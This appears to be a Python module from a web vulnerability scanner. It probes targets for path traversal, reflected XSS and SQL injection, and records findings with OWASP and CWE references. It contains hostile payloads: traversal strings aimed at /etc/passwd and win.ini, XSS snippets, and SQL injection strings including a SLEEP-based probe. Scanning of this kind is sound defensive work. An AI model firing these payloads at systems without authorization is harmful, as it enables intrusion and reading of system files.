import time
import requests
from urllib.parse import quote

from .findings import Finding, Severity, probe_result, probe_error


class _InjectionTestBase:
  """Shared execution engine for injection-style web tests."""

  def _run_injection_test(self, target, port, *, params, payloads, check_fn,
                          finding_factory, max_findings=3):
    """
    Iterate params x payloads, call check_fn(response, needle) for each,
    create findings via finding_factory(param, payload, response, url).
    """
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"
    findings = []

    for param in params:
      if len(findings) >= max_findings:
        break
      for payload, needle in payloads:
        try:
          url = f"{base_url}?{param}={payload}"
          resp = requests.get(url, timeout=3, verify=False)
          if check_fn(resp, needle):
            findings.append(finding_factory(param, payload, resp, url))
            break  # Found for this param, next param
        except Exception:
          pass

    return findings


class _WebInjectionMixin(_InjectionTestBase):
  """
  Non-destructive probes for path traversal, reflected XSS,
  and SQL injection (OWASP WSTG-INPV).
  """

  def _web_test_path_traversal(self, target, port):
    """
    Attempt path traversal via URL path and query parameters with encoding variants.

    Parameters
    ----------
    target : str
      Hostname or IP address.
    port : int
      Web port to probe.

    Returns
    -------
    dict
      Structured findings.
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    unix_needles = ("root:x:", "root:*:", "daemon:")
    win_needles = ("[boot loader]", "[operating systems]", "[fonts]")

    # --- 1. Path-based traversal ---
    path_payloads = [
      "/../../../../etc/passwd",
      "/..%2f..%2f..%2f..%2fetc/passwd",
      "/....//....//....//....//etc/passwd",
      "/../../../../windows/win.ini",
    ]
    for payload_path in path_payloads:
      if len(findings_list) >= 3:
        break
      try:
        url = base_url.rstrip("/") + payload_path
        resp = requests.get(url, timeout=2, verify=False)
        if any(n in resp.text for n in unix_needles):
          findings_list.append(Finding(
            severity=Severity.CRITICAL,
            title=f"Path traversal: /etc/passwd via path",
            description=f"Server returned /etc/passwd content via path traversal.",
            evidence=f"URL: {url}, body contains passwd markers",
            remediation="Sanitize path components; use a web application firewall.",
            owasp_id="A01:2021",
            cwe_id="CWE-22",
            confidence="certain",
          ))
          break
        if any(n in resp.text for n in win_needles):
          findings_list.append(Finding(
            severity=Severity.CRITICAL,
            title=f"Path traversal: win.ini via path",
            description=f"Server returned Windows system file content.",
            evidence=f"URL: {url}, body contains win.ini markers",
            remediation="Sanitize path components.",
            owasp_id="A01:2021",
            cwe_id="CWE-22",
            confidence="certain",
          ))
          break
      except Exception:
        pass

    # --- 2. Query parameter traversal ---
    params = ["file", "path", "page", "doc", "template", "include", "name"]
    payloads_qs = [
      ("../../../../etc/passwd", unix_needles),
      ("..%2f..%2f..%2f..%2fetc/passwd", unix_needles),
      ("..%252f..%252f..%252f..%252fetc/passwd", unix_needles),  # double-encoded
      ("..\\..\\..\\..\\windows\\win.ini", win_needles),
    ]
    for param in params:
      if len(findings_list) >= 3:
        break
      for payload, needles in payloads_qs:
        try:
          url = f"{base_url}?{param}={payload}"
          resp = requests.get(url, timeout=2, verify=False)
          if any(n in resp.text for n in needles):
            findings_list.append(Finding(
              severity=Severity.CRITICAL,
              title=f"Path traversal via ?{param}= parameter",
              description=f"Parameter '{param}' allows reading system files.",
              evidence=f"URL: {url}",
              remediation=f"Validate and sanitize the '{param}' parameter.",
              owasp_id="A01:2021",
              cwe_id="CWE-22",
              confidence="certain",
            ))
            break
        except Exception:
          pass

    return probe_result(findings=findings_list)


  def _web_test_xss(self, target, port):
    """
    Probe reflected XSS via URL path injection and query parameters.

    Tests multiple payloads across common parameter names.

    Parameters
    ----------
    target : str
      Hostname or IP address.
    port : int
      Web port to probe.

    Returns
    -------
    dict
      Structured findings.
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    xss_payloads = [
      ('<img src=x onerror=alert(1)>', 'onerror=alert'),
      ('<svg onload=alert(1)>', 'onload=alert'),
      ('<script>alert(1)</script>', '<script>alert(1)'),
      ('" onfocus="alert(1)" autofocus="', 'onfocus='),
    ]

    # --- 1. Path injection ---
    for payload, needle in xss_payloads:
      if findings_list:
        break
      try:
        url = base_url.rstrip("/") + f"/{payload}"
        resp = requests.get(url, timeout=3, verify=False)
        if needle in resp.text:
          findings_list.append(Finding(
            severity=Severity.HIGH,
            title=f"Reflected XSS via URL path",
            description=f"Payload '{payload[:40]}' reflected in response body.",
            evidence=f"URL: {url}, needle '{needle}' found in body",
            remediation="Encode output; implement Content-Security-Policy.",
            owasp_id="A03:2021",
            cwe_id="CWE-79",
            confidence="certain",
          ))
          break
      except Exception:
        pass

    # --- 2. Query parameter injection ---
    params = ["q", "search", "id", "name", "page", "input", "text"]

    def _xss_check(resp, needle):
      return needle in resp.text

    def _xss_finding(param, payload, resp, url):
      return Finding(
        severity=Severity.HIGH,
        title=f"Reflected XSS via ?{param}= parameter",
        description=f"Payload '{payload[:40]}' reflected unescaped via '{param}'.",
        evidence=f"URL: {url}",
        remediation=f"HTML-encode the '{param}' parameter in output.",
        owasp_id="A03:2021",
        cwe_id="CWE-79",
        confidence="certain",
      )

    findings_list += self._run_injection_test(
      target, port,
      params=params,
      payloads=xss_payloads,
      check_fn=_xss_check,
      finding_factory=_xss_finding,
      max_findings=3 - len(findings_list),
    )

    return probe_result(findings=findings_list)


  def _web_test_sql_injection(self, target, port):
    """
    Multi-technique SQL injection probe: error-based, boolean-blind, time-based.

    Parameters
    ----------
    target : str
      Hostname or IP address.
    port : int
      Web port to probe.

    Returns
    -------
    dict
      Structured findings.
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    sql_error_keywords = [
      "sql", "syntax", "mysql", "psql", "postgres", "sqlite", "ora-",
      "microsoft ole db", "odbc", "unclosed quotation", "unterminated",
      "you have an error in your sql",
    ]
    params = ["id", "page", "q", "user", "item", "cat"]

    # --- 1. Error-based ---
    error_payloads = [
      ("'", None),
      ("1'--", None),
      ("1 UNION SELECT NULL--", None),
      ("1' OR '1'='1", None),
    ]

    def _sqli_error_check(resp, _needle):
      body = resp.text.lower()
      return any(kw in body for kw in sql_error_keywords)

    def _sqli_error_finding(param, payload, resp, url):
      return Finding(
        severity=Severity.HIGH,
        title=f"SQL injection (error-based) via ?{param}=",
        description=f"SQL error keywords in response to payload '{payload}'.",
        evidence=f"URL: {url}",
        remediation=f"Use parameterized queries for '{param}'.",
        owasp_id="A03:2021",
        cwe_id="CWE-89",
        confidence="firm",
      )

    findings_list += self._run_injection_test(
      target, port,
      params=params,
      payloads=error_payloads,
      check_fn=_sqli_error_check,
      finding_factory=_sqli_error_finding,
      max_findings=3,
    )

    # --- 2. Boolean-blind (only if error-based found nothing) ---
    if not findings_list:
      for param in params[:3]:
        if findings_list:
          break
        try:
          url_true = f"{base_url}?{param}=1 AND 1=1"
          url_false = f"{base_url}?{param}=1 AND 1=2"
          url_base = f"{base_url}?{param}=1"

          resp_base = requests.get(url_base, timeout=3, verify=False)
          resp_true = requests.get(url_true, timeout=3, verify=False)
          resp_false = requests.get(url_false, timeout=3, verify=False)

          # Baseline should match true, differ from false
          if (resp_base.status_code == resp_true.status_code and
              abs(len(resp_base.text) - len(resp_true.text)) < 50 and
              abs(len(resp_true.text) - len(resp_false.text)) > 50):
            findings_list.append(Finding(
              severity=Severity.HIGH,
              title=f"SQL injection (boolean-blind) via ?{param}=",
              description=f"Response differs between AND 1=1 and AND 1=2.",
              evidence=f"Base size={len(resp_base.text)}, true={len(resp_true.text)}, "
                       f"false={len(resp_false.text)}",
              remediation=f"Use parameterized queries for '{param}'.",
              owasp_id="A03:2021",
              cwe_id="CWE-89",
              confidence="tentative",
            ))
        except Exception:
          pass

    # --- 3. Time-based (last resort, max 2 params) ---
    if not findings_list:
      for param in params[:2]:
        if findings_list:
          break
        try:
          url_sleep = f"{base_url}?{param}=" + quote("' AND SLEEP(2)--")
          start = time.time()
          requests.get(url_sleep, timeout=5, verify=False)
          elapsed = time.time() - start
          if elapsed >= 2.0:
            findings_list.append(Finding(
              severity=Severity.HIGH,
              title=f"SQL injection (time-based) via ?{param}=",
              description=f"SLEEP(2) caused {elapsed:.1f}s delay.",
              evidence=f"URL: {url_sleep}, elapsed={elapsed:.1f}s",
              remediation=f"Use parameterized queries for '{param}'.",
              owasp_id="A03:2021",
              cwe_id="CWE-89",
              confidence="firm",
            ))
        except Exception:
          pass

    return probe_result(findings=findings_list)
